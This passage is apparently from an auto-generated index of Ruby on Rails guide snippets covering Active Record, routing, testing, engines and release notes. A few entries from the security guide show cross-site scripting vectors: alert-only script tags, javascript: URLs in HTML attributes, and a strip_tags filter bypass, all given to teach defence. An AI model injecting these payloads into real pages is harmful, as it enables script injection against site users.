HTTP method and a confirmation dialog.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_14\n\nLANGUAGE: html\nCODE:\n```\n<a href=\"...\" data-turbo-confirm=\"Are you sure?\" data-turbo-method=\"delete\">Delete post</a>\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of first with custom order\nDESCRIPTION: SQL query for retrieving the first record with a custom ordering (by `first_name`).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_25\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers ORDER BY customers.first_name ASC LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Generating User Model in Rails Application\nDESCRIPTION: Command to generate a User model in the Rails application that will be used by the engine to represent authors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_37\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model user name:string\n```\n\n----------------------------------------\n\nTITLE: Ruby Module Extension for Delegation\nDESCRIPTION: Addition of Module#delegate_missing_to method for delegating undefined method calls to a proxy object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_1_release_notes.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nModule#delegate_missing_to\n```\n\n----------------------------------------\n\nTITLE: Implementing Action Pack Variants\nDESCRIPTION: Examples of setting up and using Action Pack variants for different device-specific views.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nrequest.variant = :tablet if request.user_agent =~ /iPad/\n```\n\nLANGUAGE: ruby\nCODE:\n```\nrespond_to do |format|\n  format.html do |html|\n    html.tablet # renders app/views/projects/show.html+tablet.erb\n    html.phone { extra_setup; render ... }\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nrespond_to do |format|\n  format.js         { render \"trash\" }\n  format.html.phone { redirect_to progress_path }\n  format.html.none  { render \"trash\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Standard Model Implementation with Primary Database in Ruby\nDESCRIPTION: Example of a model class inheriting from PrimaryApplicationRecord.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < PrimaryApplicationRecord\nend\n```\n\n----------------------------------------\n\nTITLE: Adding AWS SDK S3 Gem to Gemfile\nDESCRIPTION: Ruby code to add the aws-sdk-s3 gem to the Rails application's Gemfile.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"aws-sdk-s3\", require: false\n```\n\n----------------------------------------\n\nTITLE: Thread Database Connection Management\nDESCRIPTION: Shows the proper way to handle database connections in threads.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nThread.new {\n  Post.find(1)\n  Post.connection.close\n}.join\n```\n\n----------------------------------------\n\nTITLE: XSS Attack via HTML Attributes\nDESCRIPTION: Examples of XSS attacks through HTML image and table attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_39\n\nLANGUAGE: html\nCODE:\n```\n<img src=\"javascript:alert('Hello')\">\n<table background=\"javascript:alert('Hello')\">\n```\n\n----------------------------------------\n\nTITLE: URL Generation with Options Array\nDESCRIPTION: Example of using url_for with a hash of options inside an array\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\n#url_for takes a hash with options inside an array\n```\n\n----------------------------------------\n\nTITLE: Example Cache Increment Payload in ActiveSupport\nDESCRIPTION: Example of a payload structure for cache_increment.active_support event showing the key, store class, and increment amount when incrementing a counter in the cache.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  key: \"bottles-of-beer\",\n  store: \"ActiveSupport::Cache::RedisCacheStore\",\n  amount: 99\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Preview Paths for Action Mailer\nDESCRIPTION: Shows how to configure additional preview paths for Action Mailer previews.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.preview_paths << \"#{Rails.root}/lib/mailer_previews\"\n```\n\n----------------------------------------\n\nTITLE: Accessing Array Elements with ordinal methods in Ruby\nDESCRIPTION: This example demonstrates the use of ordinal accessor methods (`second`, `third`, `fourth`, `fifth`, `second_to_last`, `third_to_last`, `forty_two`) to access elements in an array. Defined in `active_support/core_ext/array/access.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_121\n\nLANGUAGE: ruby\nCODE:\n```\n%w(a b c d).third # => \"c\"\n%w(a b c d).fifth # => nil\n```\n\n----------------------------------------\n\nTITLE: Attachable SGID JSON Response\nDESCRIPTION: This snippet demonstrates the JSON format for returning an `attachable_sgid` from an API endpoint. This `sgid` can then be used within the `<action-text-attachment>` tag in the frontend.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_18\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"attachable_sgid\": \"BAh7CEkiCG…\"\n}\n```\n\n----------------------------------------\n\nTITLE: Basic XSS Attack Vector\nDESCRIPTION: Simple example of a Cross-Site Scripting attack using JavaScript alert.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_38\n\nLANGUAGE: html\nCODE:\n```\n<script>alert('Hello');</script>\n```\n\n----------------------------------------\n\nTITLE: Namespaced Article Controller Definition\nDESCRIPTION: Definition of the ArticlesController class within the Blorgh engine namespace\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Blorgh\n  class ArticlesController < ApplicationController\n    # ...\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Basic Validation Example in Ruby on Rails\nDESCRIPTION: Demonstrates basic validation implementation using presence validation on a Person model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :name, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Refactoring Callback Returns\nDESCRIPTION: Examples of correct and incorrect ways to handle returns in callback blocks\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_79\n\nLANGUAGE: ruby\nCODE:\n```\nclass ReadOnlyModel < ActiveRecord::Base\n  before_save { return false } # BAD\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass ReadOnlyModel < ActiveRecord::Base\n  before_save { false } # GOOD\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass ReadOnlyModel < ActiveRecord::Base\n  before_save :before_save_callback # GOOD\n\n  private\n    def before_save_callback\n      false\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: String Operations Deprecation\nDESCRIPTION: Deprecation of multibyte string operations in favor of native Ruby string methods\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_0_release_notes.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nString#downcase\nString#upcase\nString#swapcase\nString#unicode_normalize\nString#is_utf8?\n```\n\n----------------------------------------\n\nTITLE: Active Model Error Checking\nDESCRIPTION: New method for checking specific error types in ActiveModel\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_0_release_notes.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nActiveModel::Errors#of_kind?\n```\n\n----------------------------------------\n\nTITLE: Configuring UTF-8 Encoding Enforcement in Ruby on Rails\nDESCRIPTION: Adds a configuration option to handle enforcing UTF-8 encoding, defaulting to false.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_0_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: Ruby\nCODE:\n```\nconfig.action_controller.default_enforce_utf8 = false\n```\n\n----------------------------------------\n\nTITLE: Installing JavaScript Dependencies with Yarn\nDESCRIPTION: Command to install JavaScript dependencies for the Rails project using Yarn.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/development_dependencies_install.md#2025-04-23_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\n$ yarn install\n```\n\n----------------------------------------\n\nTITLE: Generating a Rails Model\nDESCRIPTION: This command tells Rails to generate a model named `Product` with a `name` column of type `string`. It creates a migration file, the model file, test files, and fixtures.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model Product name:string\n```\n\n----------------------------------------\n\nTITLE: Calculating Seconds Since Midnight in Ruby\nDESCRIPTION: This snippet demonstrates how to use the `seconds_since_midnight` method on a DateTime object to retrieve the number of seconds that have elapsed since midnight. This method is defined in `active_support/core_ext/date_time/calculations.rb` and provides a convenient way to determine the time elapsed since the start of the day.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_159\n\nLANGUAGE: ruby\nCODE:\n```\nnow = DateTime.current     # => Mon, 07 Jun 2010 20:26:36 +0000\nnow.seconds_since_midnight # => 73596\n```\n\n----------------------------------------\n\nTITLE: Truncate Bytes\nDESCRIPTION: This snippet demonstrates truncating a string to a specified byte size. Useful for handling strings with multibyte characters. The default omission is '…'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\n\"👍👍👍👍\".truncate_bytes(15)\n# => \"👍👍👍…\"\n```\n\n----------------------------------------\n\nTITLE: Rendering Objects in Rails\nDESCRIPTION: This snippet demonstrates how to render an object that responds to `#render_in` in Rails. The format is controlled by the object's `#format` method. The `render_in` method is called with the current view context.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nclass Greeting\n  def render_in(view_context)\n    view_context.render html: \"Hello, World\"\n  end\n\n  def format\n    :html\n  end\nend\n\nrender Greeting.new\n```\n\nLANGUAGE: ruby\nCODE:\n```\nrender renderable: Greeting.new\n```\n\n----------------------------------------\n\nTITLE: Rendering Partial With Locals Disabled Raises Error\nDESCRIPTION: Demonstrates the error raised when attempting to render a partial with locals when the `locals:` signature is set to empty `()`, indicating that no locals are accepted.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\nrender \"messages/message\", unknown_local: \"will raise\"\n# => ActionView::Template::Error: no locals accepted for app/views/messages/_message.html.erb\n```\n\n----------------------------------------\n\nTITLE: Subscribing with Monotonic Time for Accurate Duration in Ruby\nDESCRIPTION: Shows how to use `ActiveSupport::Notifications.monotonic_subscribe` to listen to the `process_action.action_controller` event. This method provides `started` and `finished` timestamps based on a monotonic clock, which is crucial for accurately calculating event duration, unaffected by system clock adjustments. The block receives the same arguments as the standard `subscribe` (name, started, finished, unique_id, payload), but with monotonic time values.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Notifications.monotonic_subscribe \"process_action.action_controller\" do |name, started, finished, unique_id, payload|\n  # your own custom stuff\n  duration = finished - started # 1560979.429234 - 1560978.425334\n  Rails.logger.info \"#{name} Received! (duration: #{duration})\" # process_action.action_controller Received! (duration: 1.0039)\nend\n```\n\n----------------------------------------\n\nTITLE: Wrapping the Rack Application\nDESCRIPTION: The Rackup::Server#wrapped_app method which memoizes the built application, ensuring it's only built once.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Rackup\n  class Server\n    def wrapped_app\n      @wrapped_app ||= build_app app\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using Lambda for Dynamic Disabling in options_from_collection_for_select - Rails (Ruby)\nDESCRIPTION: Illustrates passing a lambda to the :disabled option in options_from_collection_for_select to disable options dynamically based on object properties (e.g., out_of_stock?). Especially useful when the enabled/disabled state depends on model data. Requires Rails 2.3 or later; input is a collection with a predicate method; outputs options with selected/disabled attributes as appropriate.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\noptions_from_collection_for_select(@product.sizes, :name, :id, :disabled => lambda{|size| size.out_of_stock?})\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Error Subscriber in Ruby for Rails\nDESCRIPTION: Defines a custom ErrorSubscriber class that can be registered with Rails.error.subscribe. This subscriber's report method is called when an error occurs, allowing custom error reporting logic.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/error_reporting.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/error_subscriber.rb\nclass ErrorSubscriber\n  def report(error, handled:, severity:, context:, source: nil)\n    MyErrorReportingService.report_error(error, context: context, handled: handled, level: severity)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Bypassing restricted tag filtering in Ruby\nDESCRIPTION: An example showing how restricted input filtering can be bypassed by embedding script tags within other tags. This exploits older versions of Rails' tag filtering.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nstrip_tags(\"some<<b>script>alert('hello')<</b>/script>\")\n```\n\n----------------------------------------\n\nTITLE: Rails Generator Command with Dispatchers\nDESCRIPTION: Shows the command for generating dispatcher files in Rails applications\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\n--with-dispatchers\n```\n\nLANGUAGE: ruby\nCODE:\n```\nrake rails:update:generate_dispatchers\n```\n\n----------------------------------------\n\nTITLE: Adding Inventory Count to Product Form (ERB)\nDESCRIPTION: This code snippet adds a field to the product form for managing the inventory count. It uses Rails form helpers (`form_with`, `form.label`, `form.number_field`) to create the necessary HTML elements.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_96\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: product do |form| %>\n  <%# ... %>\n\n  <div>\n    <%= form.label :inventory_count, style: \"display: block\" %>\n    <%= form.number_field :inventory_count %>\n  </div>\n\n  <div>\n    <%= form.submit %>\n  </div>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Installing required gems for Rails development\nDESCRIPTION: Command to install all the required gems for Rails development using Bundler.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle install\n```\n\n----------------------------------------\n\nTITLE: Reloading Classes in Rails Console\nDESCRIPTION: This snippet demonstrates how to force a reload of classes in a Rails console session using the reload! command. It shows the change in object_id of a class after reloading.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nirb(main):001:0> User.object_id\n=> 70136277390120\nirb(main):002:0> reload!\nReloading...\n=> true\nirb(main):003:0> User.object_id\n=> 70136284426020\n```\n\n----------------------------------------\n\nTITLE: BigDecimal to String Conversion in Ruby\nDESCRIPTION: This example showcases the overridden `to_s` method for BigDecimal objects. The default specifier is set to \"F\", resulting in floating-point representation instead of engineering notation. This behavior is part of the Active Support extensions to the BigDecimal class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_109\n\nLANGUAGE: ruby\nCODE:\n```\nBigDecimal(5.00, 6).to_s       # => \"5.0\"\nBigDecimal(5.00, 6).to_s(\"e\")  # => \"0.5E1\"\n```\n\n----------------------------------------\n\nTITLE: YAML Fixture with Associations - Categories\nDESCRIPTION: This YAML fixture defines a category named 'web_frameworks'. It showcases a simple YAML fixture file with a single record.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_24\n\nLANGUAGE: yaml\nCODE:\n```\n# test/fixtures/categories.yml\nweb_frameworks:\n  name: Web Frameworks\n```\n\n----------------------------------------\n\nTITLE: Comparing Two HTML Strings for Equality\nDESCRIPTION: This code demonstrates how to use `assert_dom_equal` to compare two HTML strings and verify that they are equal.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_82\n\nLANGUAGE: ruby\nCODE:\n```\nassert_dom_equal '<a href=\"http://www.further-reading.com\">Read more</a>',\n  link_to(\"Read more\", \"http://www.further-reading.com\")\n```\n\n----------------------------------------\n\nTITLE: Start Rails Server Command - Bash\nDESCRIPTION: This bash command starts the Rails server.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_69\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails server\n```\n\n----------------------------------------\n\nTITLE: Using ActiveModel::Model for Model-Like Classes\nDESCRIPTION: This snippet demonstrates how to include `ActiveModel::Model` in a Ruby class to create a model-like object. It shows how `ActiveModel::Model` includes `ActiveModel::API` by default, enabling interaction with Action Pack and Action View.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  include ActiveModel::Model\n\n  attr_accessor :name, :age\nend\n```\n\n----------------------------------------\n\nTITLE: Appending Sensitive Parameter Filter in Rails Application Configuration (Ruby)\nDESCRIPTION: This snippet demonstrates how to append \":password\" to the Rails application's filter_parameters configuration. It ensures sensitive values for the \":password\" parameter are filtered and replaced with \"[FILTERED]\" in application logs. This pattern helps secure logged output without altering the input handling. Requires configuration access, typically placed in an environment or initializer configuration file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.filter_parameters << :password\n\n```\n\n----------------------------------------\n\nTITLE: Mailer Fixture Content - Text\nDESCRIPTION: This plain text snippet represents the content of a mailer fixture named 'invite', used for testing the `UserMailer`'s invite action. It provides a sample email body to compare against the actual generated email during unit testing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_95\n\nLANGUAGE: Text\nCODE:\n```\nHi friend@example.com,\n\nYou have been invited.\n\nCheers!\n```\n\n----------------------------------------\n\nTITLE: Creating a New Rails 4.0 Application\nDESCRIPTION: Commands to create a new Rails 4.0 application using the rails gem, covering the basic setup process.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_0_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n# You should have the 'rails' RubyGem installed\n$ rails new myapp\n$ cd myapp\n```\n\n----------------------------------------\n\nTITLE: Subscribing to Multiple Notifications via Regex in Ruby\nDESCRIPTION: Demonstrates subscribing to multiple events using a regular expression pattern with `ActiveSupport::Notifications.subscribe`. This example subscribes to all events whose names match `/action_controller/`, allowing a single block to handle various notifications originating from ActionController.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Notifications.subscribe(/action_controller/) do |event|\n  # inspect all ActionController events\nend\n```\n\n----------------------------------------\n\nTITLE: SQL Query Using Only (SQL)\nDESCRIPTION: This SQL query is the result of the previous Ruby code snippet using the `only` method, which keeps only the `where` and `order` clauses. The `limit` clause is removed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_107\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE id > 10 ORDER BY id DESC\n```\n\n----------------------------------------\n\nTITLE: Output of Generating a System Test (Bash)\nDESCRIPTION: This shows the output of the command to generate a system test using rails generate system_test. The main point is the location of the generated file under test/system/\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_67\n\nLANGUAGE: bash\nCODE:\n```\n      invoke  test_unit\n      create    test/system/articles_test.rb\n```\n\n----------------------------------------\n\nTITLE: Basic Engine Class Definition\nDESCRIPTION: Initial engine class definition that inherits from Rails::Engine\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Blorgh\n  class Engine < ::Rails::Engine\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Date Range Generation in Ruby\nDESCRIPTION: New Date#all_day method implementation for generating a full day range from a date object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_1_release_notes.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nDate#all_day\n```\n\n----------------------------------------\n\nTITLE: Accessing Route Helpers and Performing Requests in Rails Console (Ruby on Rails, IRB)\nDESCRIPTION: The code snippets show usage of the Rails console, leveraging the 'app' object for route helper access and HTTP request emulation, and 'helper' for view helpers. These operations are to be run in the Rails console environment, requiring a running and loaded Rails application instance. The 'app' object provides programmatic access for direct manipulation or testing; output will be the result of the called helpers or requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_10\n\nLANGUAGE: irb\nCODE:\n```\nirb> app.root_path\\n=> \"/\"\\n\\nirb> app.get _\\nStarted GET \"/\" for 127.0.0.1 at 2014-06-19 10:41:57 -0300\\n...\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> helper.time_ago_in_words 30.days.ago\\n=> \"about 1 month\"\\n\\nirb> helper.my_custom_helper\\n=> \"my custom helper\"\n```\n\n----------------------------------------\n\nTITLE: Adding Development Dependencies to an Engine's Gemspec\nDESCRIPTION: Demonstrates how to add a development dependency to an engine's gemspec. These dependencies are only used when developing or testing the engine itself.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_65\n\nLANGUAGE: ruby\nCODE:\n```\ns.add_development_dependency \"moo\"\n```\n\n----------------------------------------\n\nTITLE: Custom Configuration in Rails Environment\nDESCRIPTION: Demonstrates how to define and access custom configuration options using the x namespace in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_2_release_notes.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\n# config/environments/production.rb\nconfig.x.payment_processing.schedule = :daily\nconfig.x.payment_processing.retries  = 3\nconfig.x.super_debugger              = true\n```\n\n----------------------------------------\n\nTITLE: Rendering Partials with Object and Collection Shortcuts - Rails (Ruby)\nDESCRIPTION: Demonstrates concise ways to render an object or collection in Rails 2.3 views using render @object and render @collection. These approaches automatically use the correct partials based on naming conventions, reducing boilerplate. Inputs are ActiveRecord models or arrays; dependencies include Action View 2.3+; outputs are partial HTML representations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n# Equivalent of render :partial => 'articles/_article',\\n# :object => @article\\nrender @article\\n\\n# Equivalent of render :partial => 'articles/_article',\\n# :collection => @articles\\nrender @articles\n```\n\n----------------------------------------\n\nTITLE: Rolling Back the Last Migration\nDESCRIPTION: This command undoes the last executed migration. It is used to revert changes made to the database schema by the most recent migration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nbin/rails db:rollback\n```\n\n----------------------------------------\n\nTITLE: Enforcing Available Locales with I18n - Ruby\nDESCRIPTION: Configuring `I18n.enforce_available_locales` to true enforces that any locale used must be declared in the `available_locales` list. This avoids silent mistakes when referencing undeclared locales. Dependency is the I18n gem. Attempts to use an undeclared locale will raise an error.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_18\n\nLANGUAGE: Ruby\nCODE:\n```\nI18n.enforce_available_locales = true\n```\n\n----------------------------------------\n\nTITLE: Routing to Rack Application in Rails\nDESCRIPTION: This code snippet demonstrates how to route requests to a Rack application within a Rails application. It defines a route for `/application.js` that directs all requests to the `MyRackApp` Rack application. The `via: :all` ensures that all HTTP verbs are handled by the Rack app.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_54\n\nLANGUAGE: ruby\nCODE:\n```\nmatch \"/application.js\", to: MyRackApp, via: :all\n```\n\n----------------------------------------\n\nTITLE: Finding the minimum value with minimum in Rails\nDESCRIPTION: Demonstrates how to use the `minimum` method to find the minimum value of a specific column in a table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_206\n\nLANGUAGE: ruby\nCODE:\n```\nOrder.minimum(\"subtotal\")\n```\n\n----------------------------------------\n\nTITLE: Setting Root Route in Engine\nDESCRIPTION: Configuration to set articles#index as the root route of the engine\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nroot to: \"articles#index\"\n```\n\n----------------------------------------\n\nTITLE: English Product Price Format Configuration\nDESCRIPTION: YAML configuration for the English product price format that places the currency symbol before the price using variable interpolation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_26\n\nLANGUAGE: yaml\nCODE:\n```\n# config/locales/en.yml\nen:\n  product_price: \"$%{price}\"\n```\n\n----------------------------------------\n\nTITLE: Starting the Rails Console\nDESCRIPTION: This command opens the Rails console, an interactive environment for testing code and interacting with the Rails application. It allows executing Ruby code within the context of the Rails environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails console\n```\n\n----------------------------------------\n\nTITLE: Debug Helper Usage in Rails\nDESCRIPTION: Shows how to use the debug helper to display YAML representation of Ruby objects, with both the Ruby code and resulting HTML output.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\nmy_hash = { \"first\" => 1, \"second\" => \"two\", \"third\" => [1, 2, 3] }\ndebug(my_hash)\n```\n\nLANGUAGE: html\nCODE:\n```\n<pre class=\"debug_dump\">---\nfirst: 1\nsecond: two\nthird:\n- 1\n- 2\n- 3\n</pre>\n```\n\n----------------------------------------\n\nTITLE: Disabling Locals Entirely\nDESCRIPTION: Shows how to disable locals entirely by setting the `locals:` signature to empty `()`. This prevents any local variables from being passed to the partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_38\n\nLANGUAGE: erb\nCODE:\n```\n<%# app/views/messages/_message.html.erb %>\n\n<%# locals: () %>\n```\n\n----------------------------------------\n\nTITLE: Disabling SQLite3 Strict Strings Mode in Rails 7.1\nDESCRIPTION: Configuration example showing how to disable the new strict strings mode for SQLite3Adapter. This mode prevents double-quoted string literals to avoid silent errors, but can be disabled if needed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nconfig.active_record.sqlite3_adapter_strict_strings_by_default = false\n```\n\n----------------------------------------\n\nTITLE: Action Cable Appearance Channel Example in Ruby\nDESCRIPTION: This is another example of a custom channel class, `AppearanceChannel`, also inheriting from `ApplicationCable::Channel`. Similar to the `ChatChannel`, it represents another channel subscription.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_5\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/channels/appearance_channel.rb\nclass AppearanceChannel < ApplicationCable::Channel\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Internal API Methods with :nodoc: in Ruby Modules - Ruby\nDESCRIPTION: Shows how to define an internal-API method in a Ruby module or class using the :nodoc: directive in the docstring. This prevents the method from appearing in user-facing documentation. Used throughout Rails to clarify internal API boundaries. No external dependencies are required beyond Ruby, and the method's body can contain sensitive or evolving logic.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nmodule ActiveRecord::Core::ClassMethods\n  def arel_table # :nodoc:\n    # do some magic..\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Improper Translation Abstraction Example\nDESCRIPTION: Example showing incorrect abstraction for internationalization where assumptions are made about word order and formatting, which may not hold true across different languages.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_22\n\nLANGUAGE: html+erb\nCODE:\n```\n<!-- app/views/products/show.html.erb -->\n<%= \"#{t('currency')}#{@product.price}\" %>\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Storage Queues\nDESCRIPTION: Deprecation of config.active_storage.queue in favor of separate analysis and purge queue configurations\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_0_release_notes.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_storage.queues.analysis\nconfig.active_storage.queues.purge\n```\n\n----------------------------------------\n\nTITLE: Checking Empty Collections in Rails Views\nDESCRIPTION: Shows how to check if a collection is empty using the empty? method in an ERB template.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_39\n\nLANGUAGE: erb\nCODE:\n```\n<% if @author.books.empty? %>\n  No Books Found\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Creating Action 